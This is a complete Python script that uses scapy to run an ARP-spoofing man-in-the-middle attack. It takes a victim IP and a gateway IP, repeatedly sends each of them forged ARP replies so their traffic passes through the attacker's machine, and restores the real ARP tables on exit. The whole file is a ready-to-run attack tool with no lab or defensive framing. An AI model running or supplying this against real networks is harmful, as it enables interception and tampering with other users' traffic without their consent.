import scapy.all as scapy
from scapy.layers.l2 import ARP, Ether
import time
import optparse


def getUserInput():
    option_parer = optparse.OptionParser()
    option_parer.add_option("-t", "--target", dest="target", help="The target IP address.")
    option_parer.add_option("-r", "--router", dest="router_ip", help="The gateway IP address.")
    userInput = option_parer.parse_args()[0]

    if not userInput.target:
        print("Enter the victim's IP address.")
        exit(0)

    if not userInput.router_ip:
        print("Enter the router IP address.")
        exit(0)
    else:
        return userInput



def arp_poisoning(target_ip, poisoned_ip):
    targetMac = getMac(target_ip)
    arp_response = ARP(op=2, pdst=target_ip, hwdst=targetMac, psrc=poisoned_ip)
    scapy.send(arp_response, verbose=False)


def arp_reset(first_ip, second_ip):
    first_mac = getMac(first_ip)
    second_mac = getMac(second_ip)
    arp_response = ARP(op=2, pdst=first_ip, hwdst=first_mac, psrc=second_ip, hwsrc=second_mac)
    scapy.send(arp_response, verbose=False, count=6)


def getMac(ip):
    arp_request_packet = ARP(pdst=ip)
    broadcast_packet = Ether(dst="FF:FF:FF:FF:FF:FF")

    # Combining the two packets
    combined_packet = broadcast_packet / arp_request_packet
    answered_list = scapy.srp(combined_packet, timeout=1, verbose=False)[0]

    return answered_list[0][1].hwsrc


number = 0
inputs = getUserInput()
try:

    while True:
        arp_poisoning(inputs.target, inputs.router_ip)
        arp_poisoning(inputs.router_ip, inputs.target)
        number += 1
        print("\rSending packet #" + str(number), end="")
        time.sleep(5)
except KeyboardInterrupt:
    print("\nQuit")
    arp_reset(inputs.target, inputs.router_ip)
    arp_reset(inputs.router_ip, inputs.target)
